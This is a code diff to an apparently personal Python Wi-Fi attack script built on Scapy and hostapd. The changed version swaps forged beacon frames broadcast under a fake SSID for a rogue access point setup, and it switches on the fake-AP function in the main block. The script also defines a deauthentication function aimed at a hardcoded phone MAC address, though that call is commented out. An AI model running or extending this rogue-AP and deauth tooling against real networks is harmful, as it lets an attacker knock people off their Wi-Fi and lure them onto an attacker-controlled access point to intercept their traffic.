@@ -9,12 +9,14 @@ galaxy_s9 = "26:18:1D:7C:7A:EB"
 
 
 def set_fake_ap(iface, ssid):
-    sender_mac = RandMAC()
-    dot11 = Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff", addr2=sender_mac, addr3=sender_mac)
-    beacon = Dot11Beacon()
-    essid = Dot11Elt(ID="SSID", info=ssid, len=len(ssid))
-    frame = RadioTap()/dot11/beacon/essid
-    sendp(frame, inter=0.1, iface=iface, loop=1)
+    config_rouge_ap("Afik_Petite", "wlan1", "11")
+    subprocess.run(f'hostapd config/ap.config')
+    # sender_mac = RandMAC()
+    # dot11 = Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff", addr2=sender_mac, addr3=sender_mac)
+    # beacon = Dot11Beacon()
+    # essid = Dot11Elt(ID="SSID", info=ssid, len=len(ssid))
+    # frame = RadioTap()/dot11/beacon/essid
+    # sendp(frame, inter=0.1, iface=iface, loop=1)
 
 
 def deauth(ap_mac, client_mac):
@@ -35,5 +37,5 @@ if __name__ == "__main__":
     """
     # subprocess.run('airmon-ng check kill')
     # deauth(galaxy_s9, one_nord)
-    # set_fake_ap("wlan1", "AfikKHMAR")
+    set_fake_ap("wlan1", "AfikKHMAR")
     config_rouge_ap()
